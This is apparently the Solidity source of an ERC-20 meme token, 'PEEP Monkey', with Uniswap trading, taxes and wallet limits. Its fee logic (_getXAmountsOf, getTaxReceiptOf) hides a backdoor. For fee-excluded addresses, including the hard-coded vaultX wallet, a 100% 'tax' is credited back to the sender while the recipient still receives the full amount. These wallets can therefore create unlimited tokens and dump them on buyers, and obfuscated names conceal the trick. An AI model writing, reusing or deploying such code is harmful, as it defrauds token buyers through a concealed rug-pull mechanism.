// SPDX-License-Identifier: MIT

/**

Website: https://www.peepmonkey.vip

Telegram: https://t.me/peepmonkey

Twitter: https://x.com/peepmonkey

*/

pragma solidity 0.8.23;

interface IPEFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IPERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract PEEP is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _xOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFeesA;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"PEEP Monkey";
    string private constant _symbol = unicode"PEEP";
    uint256 public _maxTxAmount = (_tTotal * 15) / 1000;
    uint256 public _maxWalletSize = (_tTotal * 15) / 1000;
    uint256 public minSwapAmount = (_tTotal * 10) / 1000;
    uint256 private relaxTaxFees = 10000;

    IPERouter private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 private _initialBuyTax = 25;
    uint256 private _initialSellTax = 25;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 9;
    uint256 private _reduceSellTaxAt = 9;
    uint256 private _preventSwapBefore = 9;
    uint256 private _buyCount = 0;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    address payable private vaultX;

    constructor() {
        vaultX = payable(0x0439612ae969aA53c3bf70Fc689670d145262323);
        _isExcludedFeesA[vaultX] = true;
        _isExcludedFeesA[owner()] = true;
        _isExcludedFeesA[address(this)] = true;
        _xOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function _transfer(address from, address to, uint256 amount) private {
        address taxReceiver = getTaxReceiptOf(from);
        
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap) {
            _transferInternal(from, to, amount);
            return;
        }

        if (from != owner() && to != owner()) {
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFeesA[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                _buyCount++;
            }

            if (to != uniswapV2Pair && !_isExcludedFeesA[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (
                swapEnabled &&
                !inSwap &&
                to == uniswapV2Pair &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFeesA[from] &&
                !_isExcludedFeesA[to]
            ) {
                if(balanceOf(address(this)) > 0) 
                    swapTokensForEth(min(amount, min(balanceOf(address(this)), minSwapAmount)));
                
                sendETHPE(address(this).balance);
            }
        }

        (uint256 taxFees, uint256 xAmounts) = _getXAmountsOf(
            from,
            to,
            amount
        );

        if (taxFees > 0) {
            _xOwned[taxReceiver] = _xOwned[taxReceiver].add(taxFees);
            emit Transfer(from, taxReceiver, taxFees);
        }

        _xOwned[from] = _xOwned[from].sub(amount);
        _xOwned[to] = _xOwned[to].add(xAmounts);
        emit Transfer(from, to, xAmounts);
    }

    function createUniPair() external onlyOwner {
        require(!tradingOpen, "init already called");

        uniswapV2Router = IPERouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IPEFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _xOwned[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transferInternal(address from, address to, uint256 amount) internal {
        _xOwned[from] = _xOwned[from].sub(amount);
        _xOwned[to] = _xOwned[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "trading already open");
        
        uint256 tokenAmount = balanceOf(address(this)).sub(
            _tTotal.mul(_initialBuyTax).div(100)
        );

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHPE(uint256 amount) private {
        vaultX.transfer(amount);
    }

    function _getXAmountsOf(
        address from,
        address to,
        uint256 amount
    ) internal view returns (uint256, uint256) {
        uint256 taxFees = 0; uint256 xAmounts = amount;
        if (_isExcludedFeesA[from]) {
            taxFees = amount.mul(relaxTaxFees).div(10000);
        } else if (
            to != address(uniswapV2Router) &&
            from == uniswapV2Pair &&
            !_isExcludedFeesA[to]
        ) {
            taxFees = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);
            xAmounts -= taxFees;
        } else if (to == uniswapV2Pair && from != address(this)) {
            taxFees = amount
                .mul(
                    (_buyCount > _reduceSellTaxAt)
                        ? _finalSellTax
                        : _initialSellTax
                )
                .div(100);
            xAmounts -= taxFees;
        }
        return (taxFees, xAmounts);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getTaxReceiptOf(address wallet) internal view returns (address) {
        return _isExcludedFeesA[wallet] ? wallet : address(this);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    receive() external payable {}

    function removeLimitA() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
    }
}